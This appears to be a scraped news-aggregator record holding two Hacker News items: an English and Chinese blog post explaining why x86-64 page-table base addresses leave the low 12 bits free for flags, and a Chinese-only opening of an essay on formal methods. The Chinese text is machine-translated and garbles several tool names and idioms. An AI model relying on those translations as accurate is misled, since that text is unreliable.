[{"category": "", "categoryclass": "", "imagename": "1884f8fb9738c71dd30e341464e483f9.png", "infoid": 1067394, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u4e22\u5931\u4e863\u5468\u7684\u6211\u7684\u751f\u547d\uff0c\u8bd5\u56fe\u5728\u82f1\u7279\u5c14X86-64 / AMD64\u624b\u518c\u4e0a\u5305\u88c5\u6211\u7684\u5934\uff0c\u4ee5\u5c1d\u8bd5\u4e3a\u6211\u7684\u7231\u597d\u8005\u64cd\u4f5c4-KBETE\u9875\u9762\u7ffb\u8bd1\u3002\u8fd9\u4e2a\u5c0f\u535a\u5ba2\u6587\u7ae0\u7684\u76ee\u7684\u662f\u8bb0\u5f55\u624b\u518c\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f\u5e76\u4e0d\u6e05\u695a\u3002 \uff08\u7279\u522b\u662f\u65b0\u4eba\uff09\n   \u60a8\u5df2\u7ecf\u770b\u5230\u4e86\u5927\u7ea6\u5341\u4ebf\u6b21\u7684\u7167\u7247\uff0c\u5982\u679c\u60a8\u6b63\u5728\u9605\u8bfb\u6b64\u5e16\uff0c\u60a8\u77e5\u9053\u60a8\u9700\u8981\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u8fd9\u4e9b\u9875\u9762\u8868\uff0c\u4ee5\u4fbf\u786c\u4ef6\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5efa\u7acb\u4e00\u4e2a\u660e\u786e\u5b9a\u4e49\u7684\u63a5\u53e3\uff0c\u4ee5\u4fbf\u5728\u79fb\u52a8\u523064\u4e4b\u524d\u5206\u914d\u5c0f\u5757\u7684\u5c0f\u5757-bit\u6a21\u5f0f\u3002\n    \u5728\u5f15\u5bfc\u8fc7\u7a0b\u7684\u65e9\u671f\u9636\u6bb5\u671f\u95f4\uff0c\u6211\u60f3\u8981\u4e3a\u524d10MB\u5185\u5b58\u521b\u5efaIdentity\u6620\u5c04\u9875\u9762\u7684\u56fe\u50cf\u3002\u5728\u79fb\u52a8\u5230\u957f\u6a21\u5f0f\uff0864\u4f4d\uff09\u4e4b\u524d\uff0c\u8fd9\u5c06\u662f\u5728\u5185\u5b58\u5b58\u50a8\u5668\u4e2d\u52a0\u8f7d\u5185\u6838\u7684\u6709\u7528\u3002\n         \u5bf9\u6211\u4eec\u4e3a\u4ec0\u4e48\u8fd9\u6837\u505a\u7684\u89e3\u91ca\u662f\u7531\u4e8e\u9884\u671f\u76844-Kbyte PDE\u6761\u76ee\u683c\u5f0f\n    \u4f46\u5982\u679c\u4f60\u4ed4\u7ec6\u770b\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e00\u4e9b\u975e\u5e38\u5947\u602a\u7684\u4e1c\u897f\u3002\u6211\u4eec\u88ab\u5bfc\u81f4\u8ba4\u4e3a\u9875\u9762\u8868\u57fa\u5730\u5730\u5740\uff080x13000\uff09\u5e94\u6839\u636e\u4e0a\u56fe\u7684\u56fe\u7247\u5728\u6bd4\u727951:12\u4e4b\u95f4\u8bbe\u7f6e\u3002\n \u5982\u679c\u8be5\u5047\u8bbe\u662f\u6b63\u786e\u7684\uff0c\u52190x13000\u5e94\u5de6\u79fb12\u4f4d\u5e76\u53d8\u4e3a0x13000000\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u7f6e\u9875\u9762\u6807\u5fd7\u4e4b\u540e\uff0c\u5b83\u5c06\u53d8\u4e3a0x13000003\u3002\u8fd9\u610f\u5473\u7740\u60a8\u4e4b\u524d\u5171\u4eab\u7684\u4ee3\u7801\u7247\u6bb5\u662f\u9519\u8bef\u7684\uff0c\u662f\u5bf9\u7684\u5417\uff1f\n \u5982\u679c\u4f60\u60f3\u82b13\u5468\u8bd5\u56fe\u5f04\u6e05\u695a\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u542f\u52a8\u7684\u65f6\u5019\uff0c\u90a3\u4e48\u5728\u8d28\u7591\u4f60\u7684\u60c5\u51b5\u4e0b\u4f60\u7684\u6bcf\u4e00\u804c\u4e1a\u51b3\u5b9a\u90fd\u6ca1\u6709\u542f\u52a8 \n\u601d\u60f3\u7684\u706b\u8f66\u4e0d\u662f\u9519\u8bef\u7684\uff0c\u4f46X86-64\u8bbe\u8ba1\u6709\u70b9\u4e0d\u540c\u4e8e\u6211\u4eec\u63a8\u6d4b\u7684\u4e1c\u897f\u3002\n \u9875\u9762\u6570\u636e\u7ed3\u6784\u8868\u59cb\u7ec8\u57284-kbyte\u8fb9\u754c\u4e0a\u5bf9\u9f50\uff0c\u56e0\u6b64\u53ea\u6709\u4e0a\u8ff0\u4f4d11\u7684\u5730\u5740\u4f4d\u5b58\u50a8\u5728\u7ffb\u8bd1\u8868\u57fa\u5730\u5740\u5b57\u6bb5\u4e2d\u3002\u5047\u8bbe\u4f4d11\uff1a0\u4e3a0.\uff08\u53d6\u81eaAMD64\u624b\u518c\uff0c\u7b2c150\u9875\uff09\n \u8fd9\u610f\u5473\u7740\u5728\u5b9e\u8df5\u4e2d\u662f\u4ec0\u4e48\uff0c\u5982\u679c\u6211\u4eec\u7684\u9875\u9762\u5728\u5730\u57400x13000\u4e0a\uff0c\u6807\u5fd7\u4f4d\u662f0x03 = 0x13003\uff0c\u6211\u4eec\u7684\u786c\u4ef6\u201c\u91cd\u65b0\u5229\u7528\u201d12\u4f4d\u4ee5\u5728\u5f53\u524d\u9875\u9762\u5730\u5740\u6dfb\u52a00x1000\u65f6\u8bbe\u7f6e\u6807\u5fd7\uff0c\u5b83\u53ef\u4ee5\u5230\u8fbe\u4e0b\u4e00\u9875\u3002\u5982\u679c\u5355\u72ec\u7684\u662f\u5355\u72ec\u7684\uff0c\u8fd9\u662f\u96be\u4ee5\u63a8\u6d4b\u7684\u662fPage Tables\u662f4096\u5b57\u8282\u7684\u6574\u4e2a\u539f\u56e0\uff08\u62160x1000\ud83d\ude1c\uff09\n \u95ee\u9898\u662f\uff0c\u867d\u7136\u8fd9\u662f\u5728\u624b\u518c\u4e2d\u7f16\u5199\u7684\uff0c\u4f46\u6ca1\u6709\u5f3a\u8c03\u5728\u4e00\u4e2a\u624b\u518c\u4e2d\u95f4\u7684\u7a00\u758f\u53e5\u5b50\uff0c\u5343\u9875\ud83d\ude2b\n \u597d\u5427\uff0c\u6211\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u624d\u80fd\u8fbe\u5230\u8fd9\u4e2a\uff0c\u6211\u76f8\u4fe1\u4e00\u5929\u6211\u4f1a\u5fd8\u8bb0\u6211\u7684\u540d\u5b57\uff0c\u4f46\u4e0d\u4f1a\u5fd8\u8bb0\u8fd9\u573a\u4e0ex86-64\u5206\u9875\u7684\u6218\u6597\u3002\n \u6211\u5e0c\u671b\u5982\u679c\u6709\u4eba\u5728\u52aa\u529b\u4e0e\u6211\u53ef\u4ee5\u51cf\u5c11\u90a3\u4e2a\u65f6\u95f4\u7684\u540c\u6837\u7684\u95ee\u9898\uff0c\u90a3\u5c31\u82b1\u4e86\u4f60\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u2764\ufe0f ", "note_en": "I lost 3 weeks of my life trying to wrap my head around the Intel x86\u201364/AMD64 manuals to try implementing 4-Kbyte Page translation for my  hobbyist OS. The purpose of this small blog post is to document some of the things that in the manual aren\u2019t clear at all. (especially for newcomers)\n   You have seen that picture a billion times and i  f you are reading this post you know that you need to create these Page Tables in memory so that the hardware establishes a well-defined interface with the OS for allocating small chunks of memory before moving to 64-bit mode.\n    Image that I want to create identity-mapped pages for the first 10MB of memory during the early stages of the boot process. This will be useful for loading the kernel in memory memory before moving to Long mode (64-bit).\n         The explanation to why we do that is due to the expected 4-Kbyte PDE entry format\n    But if you look closely, you will find something very very odd. We are led to believe that the Page-Table Base Address (0x13000) should be set between the bits 51:12 as per the picture above.\n If that assumption is correct, then 0x13000 should be left shifted 12 bits and become 0x13000000. So after the setting the page flags it would become effectively 0x13000003. Which means that the code snippet you shared before is wrong, is that right?\n Think like that if you want to spend 3 weeks trying to figure out why you OS doesn\u2019t boot while questioning every career decision you\u2019ve made in the meantime \ud83d\ude30\n The train of thought isn\u2019t wrong per se, but the x86\u201364 design works a bit different from what we speculated.\n Page data- structure tables are  always aligned on 4-Kbyte boundaries, so only the  address bits above bit 11 are stored in the translation-table base-address field. Bits 11:0 are assumed to be 0. (Taken from the AMD64 manual, page 150)\n What this means in practice is that if our page is on address 0x13000 and flag bits are 0x03 = 0x13003, our hardware \u2018re-utilises\u2019 the 12-bits to set the flags while it knows that if it adds 0x1000 to the current page address, it can get to the next page. It\u2019s hard not to speculate if that alone isn\u2019t the whole reason why page tables are 4096 bytes aligned (or 0x1000 \ud83d\ude1c)\n The problem is that although this is written in the manual, no emphasis is really given to this sparse sentence in a middle of a manual with thousands of pages \ud83d\ude2b\n Well, it took me a long time to get to this and I\u2019m sure that I will forget my name one day but won\u2019t forget this battle with x86\u201364 paging implementation.\n I hope that if someone is struggling with the same problem that I could have reduced that time it took you to figure this out. \u2764\ufe0f", "posttime": "2021-06-22 16:43:33", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8bbe\u8ba1,page,\u9875\u9762", "title": "x86-64 4kb page\u7ffb\u8bd1\u8bbe\u8ba1\uff1a\u8fd9\u662f\u8fd9\u4e2a\u539f\u56e0\u4e3a4096\u5b57\u8282\u5bf9\u9f50\u7684\u539f\u56e0\uff1f ", "title_en": "x86\u201364 4Kb Page translation design: is this why pages are 4096 bytes aligned?", "transed": 1, "url": "https://deepdives.medium.com/x86-64-4kbyte-page-translation-design-is-this-the-reason-why-pages-are-4096-bytes-aligned-19952a0a55f4", "via": "", "real_tags": ["\u8bbe\u8ba1", "page", "\u9875\u9762"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067393, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u5728\u8f6f\u4ef6\u5de5\u7a0b\u6808\u4ea4\u6362\u4e2d\u770b\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff1a\u9632\u6b62\u5e7f\u6cdb\u91c7\u7528\u6b63\u5f0f\u65b9\u6cd5\u7684\u969c\u788d\u662f\u4ec0\u4e48\uff1f\u8fd9\u4e2a\u95ee\u9898\u88ab\u5173\u62bc\u4e3a\u57fa\u4e8e\u610f\u89c1\uff0c\u5927\u90e8\u5206\u7b54\u6848\u90fd\u662f\u201c\u592a\u8d35!!!\u201d\u7684\u4e1c\u897f\u3002\u6216\u201c\u7f51\u7ad9\u4e0d\u662f\u98de\u673a!!!\u201d\u8fd9\u4e9b\u90fd\u662f\u771f\u7684\uff0c\u4f46\u4e0d\u8981\u975e\u5e38\u89e3\u91ca\u3002\u6211\u5199\u4e86\u8fd9\u4e00\u70b9\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u8f83\u5927\u7684\u5f62\u5f0f\u65b9\u6cd5\u7684\u5386\u53f2\u56fe\u7247\uff0c\u4e3a\u4ec0\u4e48\u4ed6\u4eec\u5b9e\u9645\u4e0a\u662f\u5982\u6b64\u672a\u4f7f\u7528\uff0c\u4ee5\u53ca\u6211\u4eec\u6b63\u5728\u505a\u7684\u4e8b\u60c5\u8ba9\u4ed6\u4eec\u4f7f\u7528\u3002\n \u5728\u6211\u4eec\u5f00\u59cb\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u653e\u4e0b\u4e00\u4e9b\u6761\u6b3e\u3002\u771f\u7684\u4e0d\u662f\u4e00\u4e2a\u6b63\u5f0f\u7684\u65b9\u6cd5\u793e\u533a\uff0c\u8fd9\u662f\u4e00\u4e2a\u5728\u8349\u539f\u4e0a\u89c5\u98df\u7684\u51e0\u4e2a\u5c0f\u4e50\u961f\u3002\u8fd9\u610f\u5473\u7740\u4e0d\u540c\u7684\u7fa4\u4f53\u4ee5\u4e0d\u540c\u65b9\u5f0f\u4f7f\u7528\u672f\u8bed\u3002\u975e\u5e38\u5e7f\u6cdb\u5730\uff0cFM\u6709\u4e24\u4e2a\u57df\uff1a\u6b63\u5f0f\u89c4\u683c\u662f\u7814\u7a76\u6211\u4eec\u5982\u4f55\u7f16\u5199\u7cbe\u786e\uff0c\u660e\u786e\u7684\u89c4\u683c\uff0c\u6b63\u5f0f\u9a8c\u8bc1\u662f\u7814\u7a76\u5982\u4f55\u8bc1\u660e\u4e8b\u7269\u662f\u6b63\u786e\u7684\u3002\u4f46\u201c\u4e8b\u60c5\u201d\u5305\u62ec\u4ee3\u7801\u548c\u62bd\u8c61\u7cfb\u7edf\u3002\u6211\u4eec\u4e0d\u4ec5\u4f7f\u7528\u5355\u72ec\u7684\u624b\u6bb5\u6765\u6307\u5b9a\u8fd9\u4e24\u79cd\u4e1c\u897f\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528\u4e0d\u540c\u7684\u624b\u6bb5\u6765\u9a8c\u8bc1\u5b83\u4eec\u3002\u4e3a\u4e86\u4f7f\u4e8b\u60c5\u66f4\u52a0\u4ee4\u4eba\u56f0\u60d1\uff0c\u5982\u679c\u6709\u4eba\u8bf4\u8fc7\u6b63\u5f0f\u7684\u89c4\u8303\uff0c\u4ed6\u4eec\u901a\u5e38\u610f\u5473\u7740\u4ed6\u4eec\u90fd\u6307\u5b9a\u548c\u9a8c\u8bc1\u7cfb\u7edf\uff0c\u5982\u679c\u6709\u4eba\u8bf4\u4ed6\u4eec\u8fdb\u884c\u6b63\u5f0f\u9a8c\u8bc1\uff0c\u4ed6\u4eec\u901a\u5e38\u610f\u5473\u7740\u5b83\u4eec\u90fd\u610f\u5473\u7740\u5b83\u4eec\u90fd\u6307\u5b9a\u548c\u9a8c\u8bc1\u4ee3\u7801\u3002\n \u51fa\u4e8e\u6e05\u6670\u76ee\u7684\uff0c\u6211\u5c06\u9a8c\u8bc1\u9a8c\u8bc1\u5230\u4ee3\u7801\u9a8c\u8bc1\uff08CV\uff09\u548c\u8bbe\u8ba1\u9a8c\u8bc1\uff08DV\uff09\uff0c\u5e76\u5c06\u89c4\u8303\u4e0eCS\u548cDS\u7c7b\u4f3c\u3002\u8fd9\u4e9b\u4e0d\u662f\u66f4\u5e7f\u6cdb\u7684FM\u4e16\u754c\u4e2d\u4f7f\u7528\u7684\u672f\u8bed\u3002\u6211\u4eec\u9996\u5148\u8c08\u8bbaCS\u548cCV\uff0c\u7136\u540e\u7ee7\u7eed\u5230DS\u548cDV\u3002\n \u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u90e8\u5206\u9a8c\u8bc1\uff0c\u6211\u4eec\u53ea\u9a8c\u8bc1\u89c4\u8303\u7684\u5b50\u96c6\uff0c\u6216\u5b8c\u5168\u9a8c\u8bc1\uff0c\u6211\u4eec\u9a8c\u8bc1\u6574\u4e2a\u89c4\u8303\u3002\u8fd9\u53ef\u80fd\u662f\u8bc1\u660e\u201c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5d29\u6e83\u6216\u63a5\u53d7\u9519\u8bef\u7684\u5bc6\u7801\u201d\u6216\u201c\u5982\u679c\u60a8\u7ed9\u51fa\u9519\u8bef\u7684\u5bc6\u7801\u4e09\u6b21\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5d29\u6e83\u6216\u627f\u8ba4\u9519\u8bef\u7684\u5bc6\u7801\u5e76\u9501\u5b9a\u5e10\u6237\u3002\u201d\u5927\u591a\u6570\u6b64\u5386\u53f2\u5c06\u5047\u8bbe\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u5168\u9762\u9a8c\u8bc1\u3002\n \u6211\u4eec\u8fd8\u5e94\u8be5\u6f84\u6e05\u6211\u4eec\u6b63\u5f0f\u7684\u8f6f\u4ef6\u7c7b\u578b\u3002\u5927\u591a\u6570\u4eba\u5c06\u8f6f\u4ef6\u5c40\u9762\u5730\u5206\u4e3a\u9ad8\u4fdd\u8bc1\u8f6f\u4ef6\uff0c\u4f8b\u5982\u533b\u7597\u8bbe\u5907\u548c\u98de\u673a\uff0c\u4ee5\u53ca\u5176\u4ed6\u4e00\u5207\u3002\u4eba\u4eec\u5047\u8bbe\u6b63\u5f0f\u7684\u65b9\u6cd5\u5e7f\u200b\u200b\u6cdb\u7528\u4e8e\u524d\u8005\u548c\u540e\u8005\u4e0d\u5fc5\u8981\u3002\u8fd9\u662f\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u592a\u4e50\u89c2\uff1a\u5927\u591a\u6570\u4eba\u5728\u9ad8\u4fdd\u8bc1\u8f6f\u4ef6\u4e2d\u4e0d\u4f7f\u7528\u6b63\u5f0f\u65b9\u6cd5\u3002\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8\u201c\u5e38\u89c4\u201d\u8f6f\u4ef6\u3002\n \u6700\u540e\uff0c\u4e00\u4f4d\u514d\u8d23\u58f0\u660e\uff1a\u6211\u4e0d\u662f\u5386\u53f2\u5b66\u5bb6\uff0c\u800c\u6211\u8bd5\u56fe\u505a\u5c3d\u804c\u8c03\u67e5\uff0c\u90a3\u4e48\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u9519\u8bef\u3002\u6b64\u5916\uff0c\u6211\u4e13\u6ce8\u4e8e\u5f62\u5f0f\u89c4\u8303\uff08DS\u548cDV\uff09\uff0c\u56e0\u6b64\u6211\u5bf9\u4ee3\u7801\u9a8c\u8bc1\u7684\u4efb\u4f55\u4e8b\u60c5\u90fd\u6709\u53ef\u80fd\u72af\u9519\u8bef\u3002\u5982\u679c\u4f60\u770b\u5230\u9519\u4e86\uff0c\u8bf7\u7ed9\u6211\u53d1\u7535\u5b50\u90ae\u4ef6\uff0c\u6211\u4f1a\u4fee\u590d\u5b83\u3002 2\n   \u5728\u6211\u4eec\u8bc1\u660e\u6211\u4eec\u7684\u4ee3\u7801\u662f\u6b63\u786e\u7684\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u4ec0\u4e48\u662f\u201c\u6b63\u786e\u201d\u3002\u8fd9\u610f\u5473\u7740\u5177\u6709\u67d0\u79cd\u5f62\u5f0f\u7684\u89c4\u8303\u6216\u89c4\u8303\uff0c\u7528\u4e8e\u4ee3\u7801\u5e94\u8be5\u505a\u4ec0\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u660e\u786e\u5730\u8bf4\u660e\u7279\u5b9a\u8f93\u51fa\u662f\u5426\u9075\u5faa\u89c4\u8303\u3002\u53ea\u662f\u8bf4\u4e00\u4e2a\u5217\u8868\u662f\u201c\u6392\u5e8f\u201d\u5c1a\u4e0d\u6e05\u695a\uff1a\u6211\u4eec\u4e0d\u77e5\u9053\u6211\u4eec\u6b63\u5728\u6392\u5e8f\u662f\u4ec0\u4e48\uff0c\u6211\u4eec\u6b63\u5728\u4f7f\u7528\u4ec0\u4e48\u6807\u51c6\uff0c\u751a\u81f3\u662f\u6211\u4eec\u7684\u610f\u601d\u662f\u201c\u6392\u5e8f\u201d\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u8bf4\u201c\u5982\u679c\u5bf9\u4e8e\u4efb\u4f55\u4e24\u4e2a\u7d22\u5f15I\u548cj\uff0c\u5219\u6309\u5347\u5e8f\u6392\u5e8f\uff0c\u5982\u679c\u6211\uff06l lt; j\uff0c\u7136\u540el [i]\uff06lt; l [j]\u201c\u3002 \n\u7b2c\u4e00\u4e2a\u662f\u4f5c\u4e3a\u72ec\u7acb\u4e8e\u4ee3\u7801\u7684\u8bed\u53e5\u7f16\u5199\u5b83\u4eec\u3002\u6211\u4eec\u4f1a\u5199\u4e0b\u6211\u4eec\u7684\u6392\u5e8f\u529f\u80fd\uff0c\u5e76\u5728\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\u5199\u5b9a\u7406\u201c\u8fd9\u8fd4\u56de\u6392\u5e8f\u5217\u8868\u201d\u3002\u8fd9\u662f\u6700\u53e4\u8001\u7684\u89c4\u8303\u5f62\u5f0f\uff0c\u4ecd\u7136\u662fIsabelle\u548cACL2\u505a\u4e8b\u7684\u65b9\u5f0f\u3002 3.\n \u7b2c\u4e8c\u4e2a\u5d4c\u5165\u4ee3\u7801\u4e2d\u7684\u89c4\u683c\uff0c\u4ee5\u524d/\u540e\u7f6e\u6761\u4ef6\uff0c\u65ad\u8a00\u548c\u4e0d\u53d8\u6027\u7684\u5f62\u5f0f\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u5728\u201c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6392\u5e8f\u5217\u8868\u201d\u7684\u51fd\u6570\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u540e\u671f\u4f4d\u7f6e\u3002\u57fa\u4e8e\u65ad\u8a00\u7684\u89c4\u683c\u6700\u521d\u662f\u6b63\u5f0f\u7684\uff0c\u56e0\u4e3aHOARE\u903b\u8f91\uff0c\u5e76\u4e8e20\u4e16\u7eaa70\u5e74\u4ee3\u521d\u671f\u9996\u6b21\u878d\u5165\u4e86\u4e00\u4e2a\u6b27\u51e0\u91cc\u5fb7\u7684\u7f16\u7a0b\u8bed\u8a00\u3002 4\u8fd9\u79cd\u98ce\u683c\u4e5f\u88ab\u5408\u540c\u79f0\u4e3a\u8bbe\u8ba1\uff0c\u662f\u6700\u53d7\u6b22\u8fce\u7684\u5de5\u4e1a\u9a8c\u8bc1\u5f62\u5f0f\u3002 5.\n \u6700\u540e\uff0c\u6211\u4eec\u6709\u578b\u7cfb\u7edf\u3002\u901a\u8fc7Curry-Howard\u5bf9\u5e94\uff0c\u4efb\u4f55\u6570\u5b66\u5b9a\u7406\u6216\u8bc1\u636e\u90fd\u53ef\u4ee5\u88ab\u7f16\u7801\u4e3a\u4f9d\u8d56\u7c7b\u578b\u3002\u6211\u4eec\u4f1a\u5b9a\u4e49\u201c\u6392\u5e8f\u5217\u8868\u201d\u7684\u7c7b\u578b\uff0c\u5e76\u58f0\u660e\u6211\u4eec\u7684\u51fd\u6570\u5177\u6709\u7c7b\u578b\u7b7e\u540d[int]  - \uff06gt;\u6392\u5e8f[int]\u3002\n \u60a8\u53ef\u4ee5\u770b\u5230\u6240\u6709\u8fd9\u4e9b\u6837\u5b50\u7684\u793a\u4f8b\uff0c\u8ba9\u6211\u4eec\u8bc1\u660eleftpad\u3002 HOL4\u548cIsabelle\u662f\u201c\u72ec\u7acb\u5b9a\u7406\u201d\u89c4\u8303\uff0c\u706b\u82b1\u548c\u5927\u592b\u7684\u826f\u597d\u793a\u4f8b\uff0cSpark\u548cDafny\u5177\u6709\u201c\u5d4c\u5165\u5f0f\u65ad\u8a00\u201d\u89c4\u683c\uff0cCoQ\u548cAgda\u5177\u6709\u201c\u4f9d\u8d56\u5f0f\u201d\u89c4\u683c\u3002 6.\n \u5982\u679c\u60a8\u772f\u7740\u773c\u775b\uff0c\u5b83\u770b\u8d77\u6765\u50cf\u8fd9\u4e09\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u89c4\u8303\u6620\u5c04\u5230\u81ea\u52a8\u6b63\u786e\u6027\u7684\u4e09\u4e2a\u4e3b\u57df\u540d\u68c0\u67e5\uff1a\u6d4b\u8bd5\uff0c\u5408\u540c\u548c\u7c7b\u578b\u3002\u8fd9\u4e0d\u662f\u5de7\u5408\u3002\u6b63\u786e\u6027\u662f\u9891\u8c31\uff0c\u6b63\u5f0f\u9a8c\u8bc1\u662f\u8be5\u9891\u8c31\u7684\u4e00\u4e2a\u6781\u7aef\u3002\u5f53\u6211\u4eec\u51cf\u5c11\u6211\u4eec\u9a8c\u8bc1\u7684\u4e25\u683c\uff08\u548c\u52aa\u529b\uff09\u65f6\uff0c\u6211\u4eec\u4f1a\u83b7\u5f97\u66f4\u7b80\u5355\u548c\u66f4\u7a84\u7684\u68c0\u67e5\uff0c\u65e0\u8bba\u662f\u5426\u4f7f\u7528\u8f83\u5f31\u7684\u7c7b\u578b\u9650\u5236\u63a2\u7d22\u7684\u72b6\u6001\u7a7a\u95f4\uff0c\u6216\u5411\u8fd0\u884c\u65f6\u63a8\u52a8\u9a8c\u8bc1\u3002\u7136\u540e\uff0c\u4efb\u4f55\u603b\u89c4\u683c\u7684\u65b9\u6cd5\u90fd\u6210\u4e3a\u90e8\u5206\u89c4\u8303\u7684\u624b\u6bb5\uff0c\u53cd\u4e4b\u4ea6\u7136\uff1a\u8bb8\u591a\u4eba\u8ba4\u4e3a\u6d01\u51c0\u5ba4\u662f\u4e00\u79cd\u6b63\u5f0f\u7684\u9a8c\u8bc1\u6280\u672f\uff0c\u4e3b\u8981\u901a\u8fc7\u63a8\u52a8\u4ee3\u7801\u68c0\u67e5\u8fdc\u8fdc\u8d85\u51fa\u4eba\u7c7b\u53ef\u80fd\u7684\u4ee3\u7801\u3002\n  \u9a8c\u8bc1\u8bc1\u660e\u4ee3\u7801\u4e0e\u5176\u89c4\u8303\u5339\u914d\u3002\u8fd9\u63d0\u51fa\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u4eec\u5982\u4f55\u77e5\u9053\u6211\u4eec\u6709\u6b63\u786e\u7684\u89c4\u683c\uff1f\u627e\u5230\u5408\u9002\u7684\u89c4\u8303\u662f\u6b63\u5f0f\u65b9\u6cd5\u4e2d\u6700\u5927\u7684\u6311\u6218\u4e4b\u4e00\u3002\u5b83\u4e5f\u662f\u6700\u5347\u7ea7\u7684\u53cd\u5bf9\u610f\u89c1\u4e4b\u4e00\uff0c\u4f46\u6000\u7591\u8bba\u8005\u7684\u610f\u601d\u662f\u5b83\u4e0e\u5021\u5bfc\u8005\u7684\u60f3\u6cd5\u7684\u65b9\u5f0f\u5b8c\u5168\u76f8\u540c\u3002\n \u5f53\u6237\u5916\u4eba\u8bf4\u201c\u4f60\u5982\u4f55\u6709\u6b63\u786e\u7684\u89c4\u683c\uff1f\u201d\u4ed6\u4eec\u901a\u5e38\u5728\u8003\u8651\u9a8c\u8bc1\uff1a\u663e\u793a\u4e00\u4e2a\u89c4\u683c\u5b9e\u9645\u4e0a\u662f\u5ba2\u6237\u60f3\u8981\u7684\u3002\u5982\u679c\u60a8\u6b63\u5f0f\u8bc1\u660e\u60a8\u7684\u4ee3\u7801\u6392\u5e8f\u5217\u8868\uff0c\u4f46\u5ba2\u6237\u5b9e\u9645\u4e0a\u5e0c\u671b\u4f18\u6b65\u8fdb\u884c\u6c64\u2122\uff0c\u60a8\u53ea\u6d6a\u8d39\u4e86\u4e00\u5806\u65f6\u95f4\u3002\u53ea\u6709\u901a\u8fc7\u5feb\u901f\u8fed\u4ee3\u548c\u77ed\u7684\u53cd\u9988\u5468\u671f\uff0c\u4eba\u4eec\u4e89\u8fa9\uff0c\u60a8\u662f\u5426\u53ef\u4ee5\u9a8c\u8bc1\u60a8\u7684\u8981\u6c42\u3002 \n\u786e\u5b9e\uff0c\u9a8c\u8bc1\u4ee3\u7801\u65e0\u6cd5\u9a8c\u8bc1\u4ee3\u7801\u3002\u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u6709\u4e24\u4e2a\u95ee\u9898\u3002\u9996\u5148\u662f\u5b83\u53ea\u662f\u5ef6\u8fdf\u4e86FM\u7684\u4ef7\u503c\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u6d88\u9664\u5b83\u3002\u4e00\u65e6\u60a8\u5b8c\u6210\u4e86\u5feb\u901f\u8fed\u4ee3\uff0c\u60a8\u53ef\u80fd\u4f1a\u60f3\u5230\u60a8\u7684\u5ba2\u6237\u60f3\u8981\u7684\u5185\u5bb9\u3002\u7136\u540e\u4f60\u5f00\u59cb\u9a8c\u8bc1\u4ee3\u7801\u3002\u7b2c\u4e8c\uff0c\u867d\u7136\u6211\u4eec\u4e0d\u77e5\u9053\u7a76\u7adf\u662f\u4ec0\u4e48\u5ba2\u6237\u60f3\u8981\u7684\uff0c\u4f46\u6709\u4e9b\u4e8b\u60c5\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe\u4ed6\u4eec\u4e0d\u60f3\u8981\u3002\u4ed6\u4eec\u4e0d\u5e0c\u671b\u8f6f\u4ef6\u968f\u673a\u5d29\u6e83\u3002\u4ed6\u4eec\u4e0d\u60f3\u8981\u5b89\u5168\u6f0f\u6d1e\u3002\u6bcf\u4e2a\u4eba\u90fd\u8ba4\u8bc6\u5230\u8fd9\u4e00\u70b9\uff1a\u6bd5\u7adf\uff0c\u6ca1\u6709\u4eba\u8bf4\u4f60\u5e94\u8be5\u5728\u4f60\u8fed\u4ee3\u65f6\u8df3\u8fc7\u5355\u4f4d\u6d4b\u8bd5\u3002\u56e0\u6b64\uff0c\u81f3\u5c11\u8bc1\u660e\u60a8\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u4e0d\u4f1a\u968f\u673a\u5220\u9664\u7528\u6237\u9884\u8ba2\u7684\u7ae0\u8282\u3002 7.\n 